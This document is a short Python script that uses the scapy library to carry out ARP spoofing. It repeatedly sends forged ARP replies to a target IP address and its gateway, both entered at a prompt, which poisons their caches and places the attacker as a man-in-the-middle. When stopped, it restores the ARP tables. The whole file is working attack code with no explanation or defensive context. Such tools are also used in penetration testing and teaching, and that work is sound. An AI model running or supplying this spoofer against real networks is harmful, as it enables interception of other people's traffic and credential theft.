try:
    import scapy.all as scapy
except Exception as e:
    raise SystemExit("pip install scapy")
from time import sleep

class ARPSpoofer:
    def __init__(self, target, gateway):
        self.target = target
        self.gateway = gateway

    def resolve_mac(self, ip):
        arp_req = scapy.ARP(pdst = ip)
        bc = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
        arp_bc = bc / arp_req
        answers = scapy.srp(arp_bc, timeout = 3, verbose = False)[0]
        print(answers)
        if answers:
            print(answers[0][1].hwsrc)
            return answers[0][1].hwsrc
        else:
            print(f"Failed to resolve MAC for IP: {ip}")
            return None

    def spoofing(self, target, spoofer):
        target_mac = self.resolve_mac(target)
        if target_mac is None:
            print(f"Cannot spoof as MAC for {target}, could not be identified!")
            return
        paquete = scapy.ARP(op = 2, pdst = target, hwdst = target_mac, psrc = spoofer)
        scapy.send(paquete, verbose = False)

    def restart(self, dst_ip, src_ip):
        destination_mac = self.resolve_mac(dst_ip)
        src_mac = self.resolve_mac(src_ip)

        if destination_mac is None or src_mac is None:
            print(f"Failed to restore the ARP table for {dst_ip} or {src_ip}.")
            return

        paquete = scapy.ARP(op = 2, pdst = dst_ip, hwdst = destination_mac, psrc = src_ip, hwsrc = src_mac)
        scapy.send(paquete, verbose = False)


    def __call__(self):
        try:
            packet_counter = 0
            while True:
                self.spoofing(self.target, self.gateway)
                self.spoofing(self.gateway, self.target)
                packet_counter += 2
                print(f"\r[*] Packets sent: {packet_counter}", end = "")
                sleep(.2)
        except KeyboardInterrupt:
            print(f"\nCTRL+C pressed, aborting...")
            self.restart(self.target, self.gateway)
            self.restart(self.gateway, self.target)
            print("[*] Spoofer stopped!")

target_ip = input("Enter the target IPv4 address: ")
gateway_ip = input("Enter the target gateway IPv4 address: ")

spoofer = ARPSpoofer(target_ip, gateway_ip)
spoofer()

